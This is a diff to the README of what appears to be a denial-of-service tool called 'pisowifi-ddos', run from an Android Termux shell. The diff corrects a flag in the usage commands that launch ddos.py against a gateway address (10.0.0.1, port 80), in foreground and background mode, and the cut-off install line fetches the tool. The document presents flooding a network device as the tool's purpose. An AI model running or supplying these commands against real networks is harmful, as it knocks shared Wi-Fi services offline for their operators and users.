@@ -34,12 +34,12 @@ pkg update && pkg upgrade -y && pkg install git python python-pip -y && git clon
 cd ~/pisowifi-ddos
 ```
 ```
-python ddos.py -t 10.0.0.1 -p 80 -t 135
+python ddos.py -s 10.0.0.1 -p 80 -t 135
 ```
 > Background mode
 
 ```
-python ddos.py -t 10.0.0.1 -p 80 -t 135 2>&1 &
+python ddos.py -s 10.0.0.1 -p 80 -t 135 2>&1 &
 ```
 
 <div align="center">
